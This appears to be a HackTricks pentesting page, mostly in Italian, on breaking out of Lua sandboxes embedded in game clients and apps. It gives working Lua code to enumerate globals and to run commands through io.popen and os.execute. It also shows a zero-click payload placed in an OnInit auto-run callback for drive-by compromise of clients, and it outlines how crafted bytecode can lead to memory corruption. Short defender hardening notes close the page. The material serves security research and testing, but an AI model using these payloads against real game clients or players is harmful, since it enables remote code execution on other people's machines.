# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Questa pagina raccoglie tecniche pratiche per enumerare e uscire dalle Lua "sandboxes" integrate nelle applicazioni (in particolare game clients, plugins o in-app scripting engines). Molti engine espongono un ambiente Lua ristretto, ma lasciano globals potenti raggiungibili che permettono l'esecuzione arbitraria di comandi o anche la corruzione nativa della memoria quando sono esposti bytecode loaders.

Concetti chiave:
- Considera la VM come un ambiente sconosciuto: enumera _G e scopri quali primitive pericolose sono raggiungibili.
- Quando stdout/print è bloccato, sfrutta qualsiasi canale UI/IPC in-VM come sink di output per osservare i risultati.
- Se io/os è esposto, spesso puoi ottenere esecuzione diretta di comandi (io.popen, os.execute).
- Se load/loadstring/loadfile sono esposti, l'esecuzione di bytecode Lua appositamente creato può compromettere la sicurezza della memoria in alcune versioni (≤5.1 i verifier sono bypassabili; 5.2 ha rimosso il verifier), permettendo exploitation avanzata.

## Enumerare l'ambiente sandboxed

- Esegui il dump dell'ambiente globale per inventariare le tabelle/funzioni raggiungibili:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Se print() non è disponibile, riutilizza i canali in-VM. Esempio tratto da uno script VM per il housing di un MMO in cui l'output della chat funziona solo dopo una sound call; quanto segue costruisce una funzione di output affidabile:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Generalizza questo schema per il tuo target: qualsiasi campo di testo, toast, logger o callback UI che accetti stringhe può fungere da stdout per la ricognizione.

## Esecuzione diretta di comandi se io/os è esposto

Se la sandbox espone ancora le librerie standard io o os, è probabile che tu abbia esecuzione immediata di comandi:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Note:
- L'esecuzione avviene all'interno del processo client; molti strati anti-cheat/antidebug che bloccano debugger esterni non impediranno la creazione di processi in-VM.
- Controllare anche: package.loadlib (caricamento arbitrario di DLL/.so), require con native modules, LuaJIT's ffi (se presente), e la debug library (può elevare i privilegi all'interno della VM).

## Zero-click triggers tramite auto-run callbacks

Se l'applicazione host invia script ai client e la VM espone hook di auto-run (es. OnInit/OnLoad/OnEnter), posiziona il tuo payload lì per una compromissione drive-by non appena lo script viene caricato:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Qualsiasi callback equivalente (OnLoad, OnEnter, etc.) generalizza questa tecnica quando gli script vengono trasmessi ed eseguiti automaticamente sul client.

## Primitive pericolose da cercare durante il recon

Durante l'enumerazione di _G, cerca specificamente:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: eseguono sorgente o bytecode; permettono il caricamento di bytecode non attendibile.
- package, package.loadlib, require: caricamento dinamico di librerie e superficie dei moduli.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, e hooks.
- LuaJIT-only: ffi.cdef, ffi.load per chiamare codice nativo direttamente.

Esempi minimi di utilizzo (se raggiungibili):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Optional escalation: abusing Lua bytecode loaders

Quando load/loadstring/loadfile sono raggiungibili ma io/os sono limitati, l'esecuzione di crafted Lua bytecode può portare a memory disclosure and corruption primitives. Punti chiave:
- Lua ≤ 5.1 aveva un bytecode verifier con bypass noti.
- Lua 5.2 ha rimosso completamente il verifier (posizione ufficiale: le applicazioni dovrebbero semplicemente rifiutare i precompiled chunks), ampliando la superficie d'attacco se il bytecode loading non è proibito.
- Tipici workflow: leak pointers via in-VM output, craft bytecode per creare type confusions (es., attorno a FORLOOP o altri opcodes), poi pivotare verso arbitrary read/write o native code execution.

Questo percorso è specifico per engine/versione e richiede RE. Vedi le referenze per deep dives, exploitation primitives e esempi di gadgetry nei giochi.

## Detection and hardening notes (for defenders)

- Server side: reject or rewrite user scripts; allowlist safe APIs; strip or bind-empty io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: run Lua with a minimal _ENV, forbid bytecode loading, reintroduce a strict bytecode verifier or signature checks, and block process creation from the client process.
- Telemetry: alert on gameclient → child process creation shortly after script load; correlate with UI/chat/script events.

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
